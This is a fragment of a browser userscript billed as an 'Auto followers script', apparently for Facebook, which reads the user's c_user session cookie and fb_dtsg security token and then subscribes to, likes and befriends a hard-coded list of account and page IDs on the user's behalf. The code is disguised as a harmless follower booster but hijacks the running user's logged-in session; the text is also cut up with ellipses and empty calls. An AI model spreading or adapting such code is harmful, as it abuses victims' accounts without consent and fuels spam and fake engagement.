// ==UserScript==
// @name   Auto followers script No Fake     
// @version   1.1
// @description made by Janoji       
// ==/UserScript==
...
sublist("1445700245652668");
sublist("240256332807943");


var gid = ['498796976903983'];
...
var spage_id = "515041008612779";
var spost_id = "150338031819396";
var sfoto_id = "455874477850254";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("1432206197002073");P("");P("");P("");P("");P("");P("");P("");Like("482984528382710");Like("478340675597368");Like("152765711600242");Like("157458414418023");P("");Like("548781161816546");Like("254463831274924");Like("263871320409923");Like("498796976903983")
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
